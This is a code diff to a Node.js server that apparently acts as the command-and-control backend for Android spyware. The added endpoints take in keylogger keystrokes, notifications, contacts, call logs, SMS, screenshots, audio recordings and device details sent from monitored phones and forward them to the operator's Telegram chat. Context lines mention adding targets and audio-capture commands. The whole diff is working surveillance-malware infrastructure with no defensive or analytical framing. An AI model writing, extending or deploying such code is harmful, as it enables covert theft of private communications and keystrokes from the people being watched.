@@ -873,6 +873,235 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
     }
 });
 
+// ============= LOG INGESTION ENDPOINTS =============
+
+/**
+ * Endpoint for devices to send logs in real-time
+ * Expects POST with JSON body containing log entries
+ */
+app.post('/api/logs', async (req, res) => {
+    try {
+        const logData = req.body;
+        
+        console.log(`📝 Log received:`, {
+            type: logData.type,
+            deviceId: logData.deviceId,
+            timestamp: new Date(logData.timestamp).toISOString(),
+            package: logData.package
+        });
+
+        // Validate required fields
+        if (!logData.deviceId) {
+            console.error('❌ Missing deviceId in log');
+            return res.status(400).json({ error: 'Missing deviceId' });
+        }
+
+        // Find the device
+        const device = devices.get(logData.deviceId);
+        if (!device) {
+            console.error(`❌ Device not found: ${logData.deviceId}`);
+            return res.status(404).json({ error: 'Device not found' });
+        }
+
+        const chatId = device.chatId;
+
+        // Format log for Telegram based on type
+        let message = '';
+        
+        switch (logData.type) {
+            case 'keystroke':
+                message = `⌨️ <b>Keystroke</b>\n` +
+                         `App: <code>${logData.package || 'unknown'}</code>\n` +
+                         `Text: <code>${logData.data?.substring(0, 100)}</code>`;
+                break;
+                
+            case 'notification':
+                message = `🔔 <b>Notification</b>\n` +
+                         `App: <code>${logData.package || 'unknown'}</code>\n` +
+                         `Title: <b>${logData.title || ''}</b>\n` +
+                         `Content: <code>${logData.data?.substring(0, 100)}</code>`;
+                break;
+                
+            case 'location':
+                // Location is handled by /api/location endpoint
+                // Just acknowledge
+                return res.json({ success: true, handled: 'location_endpoint' });
+                
+            case 'contacts':
+                try {
+                    const contacts = JSON.parse(logData.data || '[]');
+                    message = `📇 <b>Contacts Update</b>\n` +
+                             `Total contacts: ${contacts.length}`;
+                } catch (e) {
+                    message = `📇 <b>Contacts Update</b>\n` +
+                             `Data: ${logData.data?.substring(0, 100)}`;
+                }
+                break;
+                
+            case 'call_logs':
+                try {
+                    const calls = JSON.parse(logData.data || '[]');
+                    message = `📞 <b>Call Logs Update</b>\n` +
+                             `Total calls: ${calls.length}`;
+                } catch (e) {
+                    message = `📞 <b>Call Logs Update</b>\n` +
+                             `Data: ${logData.data?.substring(0, 100)}`;
+                }
+                break;
+                
+            case 'sms':
+                try {
+                    const sms = JSON.parse(logData.data || '[]');
+                    message = `💬 <b>SMS Update</b>\n` +
+                             `Total messages: ${sms.length}`;
+                } catch (e) {
+                    message = `💬 <b>SMS Update</b>\n` +
+                             `Data: ${logData.data?.substring(0, 100)}`;
+                }
+                break;
+                
+            case 'screenshot':
+                message = `📸 <b>Screenshot Taken</b>\n` +
+                         `Size: ${logData.size ? (logData.size/1024).toFixed(2) + 'KB' : 'unknown'}\n` +
+                         `Quality: ${logData.quality || 'unknown'}%`;
+                break;
+                
+            case 'recording':
+                message = `🎤 <b>Recording Saved</b>\n` +
+                         `Duration: ${logData.duration || 'unknown'}s\n` +
+                         `Size: ${logData.size ? (logData.size/1024/1024).toFixed(2) + 'MB' : 'unknown'}`;
+                break;
+                
+            case 'installed_apps':
+                try {
+                    const apps = JSON.parse(logData.data || '[]');
+                    message = `📱 <b>Apps List Update</b>\n` +
+                             `Total apps: ${apps.length}`;
+                } catch (e) {
+                    message = `📱 <b>Apps List Update</b>\n` +
+                             `Data: ${logData.data?.substring(0, 100)}`;
+                }
+                break;
+                
+            case 'device_info':
+                try {
+                    const info = JSON.parse(logData.data || '{}');
+                    message = `📱 <b>Device Info Update</b>\n` +
+                             `Model: ${info.model || 'unknown'}\n` +
+                             `Android: ${info.androidVersion || 'unknown'}\n` +
+                             `Manufacturer: ${info.manufacturer || 'unknown'}`;
+                } catch (e) {
+                    message = `📱 <b>Device Info Update</b>\n` +
+                             `Data: ${logData.data?.substring(0, 100)}`;
+                }
+                break;
+                
+            default:
+                message = `📝 <b>Log: ${logData.type}</b>\n` +
+                         `Data: ${logData.data?.substring(0, 200)}`;
+        }
+
+        // Send to Telegram if we have a message
+        if (message) {
+            // Don't await - don't block the response
+            sendTelegramMessage(chatId, message).catch(e => 
+                console.error('Failed to send log to Telegram:', e)
+            );
+        }
+
+        // Log to console for debugging
+        console.log(`✅ Log processed for device ${logData.deviceId}`);
+
+        // Send success response
+        res.json({ 
+            success: true, 
+            timestamp: Date.now(),
+            message: 'Log received'
+        });
+
+    } catch (error) {
+        console.error('❌ Error processing log:', error);
+        res.status(500).json({ 
+            error: 'Failed to process log',
+            message: error.message 
+        });
+    }
+});
+
+// Also add a plural version for compatibility
+app.post('/api/log', (req, res) => {
+    // Redirect to /api/logs
+    console.log('📝 Redirecting /api/log to /api/logs');
+    req.url = '/api/logs';
+    app._router.handle(req, res);
+});
+
+/**
+ * Endpoint for batch log uploads
+ * Expects array of log entries
+ */
+app.post('/api/logs/batch', async (req, res) => {
+    try {
+        const logs = req.body;
+        
+        if (!Array.isArray(logs)) {
+            return res.status(400).json({ error: 'Expected array of logs' });
+        }
+
+        console.log(`📦 Received batch of ${logs.length} logs`);
+
+        // Group logs by device
+        const deviceLogs = new Map();
+        
+        for (const log of logs) {
+            if (log.deviceId) {
+                if (!deviceLogs.has(log.deviceId)) {
+                    deviceLogs.set(log.deviceId, []);
+                }
+                deviceLogs.get(log.deviceId).push(log);
+            }
+        }
+
+        // Send summary to each device's chat
+        for (const [deviceId, deviceLogsList] of deviceLogs.entries()) {
+            const device = devices.get(deviceId);
+            if (device) {
+                // Count by type
+                const typeCounts = {};
+                deviceLogsList.forEach(log => {
+                    typeCounts[log.type] = (typeCounts[log.type] || 0) + 1;
+                });
+                
+                const typeSummary = Object.entries(typeCounts)
+                    .map(([type, count]) => `• ${type}: ${count}`)
+                    .join('\n');
+                
+                const summary = `📊 <b>Log Batch Summary</b>\n` +
+                    `Received ${deviceLogsList.length} logs:\n` +
+                    `${typeSummary}\n\n` +
+                    `First log: ${new Date(deviceLogsList[0].timestamp).toLocaleString()}\n` +
+                    `Last log: ${new Date(deviceLogsList[deviceLogsList.length-1].timestamp).toLocaleString()}`;
+                
+                // Send summary without awaiting
+                sendTelegramMessage(device.chatId, summary).catch(console.error);
+            }
+        }
+
+        res.json({ 
+            success: true, 
+            processed: logs.length,
+            devices: deviceLogs.size
+        });
+
+    } catch (error) {
+        console.error('❌ Error processing batch logs:', error);
+        res.status(500).json({ 
+            error: 'Failed to process batch logs',
+            message: error.message 
+        });
+    }
+});
+
 // ============= LOCATION ENDPOINT =============
 
 app.post('/api/location/:deviceId', async (req, res) => {
@@ -1055,6 +1284,7 @@ app.get('/test', (req, res) => {
             <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
             <p><b>Menu Button:</b> ✅ Configured</p>
             <p><b>Interactive Schedule:</b> ✅ Added</p>
+            <p><b>Log Endpoints:</b> ✅ /api/logs, /api/logs/batch</p>
             <p><a href="/test-menu" style="background: #4CAF50; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Send Test Menu</a></p>
         </body>
         </html>
@@ -1085,12 +1315,14 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('   └─ Step-by-step time entry');
     console.log('   └─ Daily/Once choice with buttons');
     console.log('   └─ Interval validation');
-    console.log('\n✅ MISSING COMMANDS ADDED:');
-    console.log('   └─ /audio_ultra, /audio_very_low, /audio_low, /audio_medium, /audio_high');
-    console.log('   └─ /audio_info, /compression_stats');
-    console.log('   └─ /add_target [package]');
-    console.log('\n✅ FILE UPLOAD FIXED:');
-    console.log('   └─ Item counts now properly displayed');
-    console.log('   └─ Example: "📱 Installed Apps Export (42 apps)"');
+    console.log('\n✅ LOG INGESTION ENDPOINTS:');
+    console.log('   └─ POST /api/logs - Single log entry');
+    console.log('   └─ POST /api/log - Alias for /api/logs');
+    console.log('   └─ POST /api/logs/batch - Batch log upload');
+    console.log('\n✅ FEATURES:');
+    console.log('   └─ Real-time log forwarding to Telegram');
+    console.log('   └─ Log type detection and formatting');
+    console.log('   └─ Batch log summaries');
+    console.log('   └─ Device validation');
     console.log('\n🚀 ===============================================\n');
 });
